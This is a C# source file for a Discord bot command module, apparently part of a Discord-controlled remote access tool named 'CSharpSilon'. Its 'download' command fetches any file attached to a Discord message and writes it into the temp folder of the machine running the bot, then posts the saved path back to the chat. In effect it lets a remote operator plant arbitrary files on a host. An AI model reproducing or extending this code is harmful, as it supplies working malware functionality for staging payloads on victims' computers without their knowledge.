using System.IO;
using System.Linq;
using System.Net.Http;
using Discord.Commands;
using Discord.WebSocket;
using System.Threading.Tasks;

namespace CSharpSilon.cmds
{
    public class FileDownloading : ModuleBase<SocketCommandContext>
    {
        
        private readonly HttpClient _httpClient = new HttpClient();
        [Command("download")]
        [Summary("Download A File To The User's Machine.")]
        public async Task Download()
        {
            if (Context.Message.Attachments.Count >= 1)
            {
                var atch = Context.Message.Attachments.First();
                var tmp = Path.Combine(Path.GetTempPath(), atch.Filename);
                using (var stream = await _httpClient.GetStreamAsync(atch.Url))
                {
                    using (var fileStream = new FileStream(tmp, FileMode.Create, FileAccess.Write, FileShare.None))
                    {
                        await stream.CopyToAsync(fileStream);
                    }
                }
                await ReplyAsync($"Downloaded Attachment To: ```{tmp}```");
            }
            else
            {
                await ReplyAsync("No Attachments Uploaded");
            }
        }
    }
}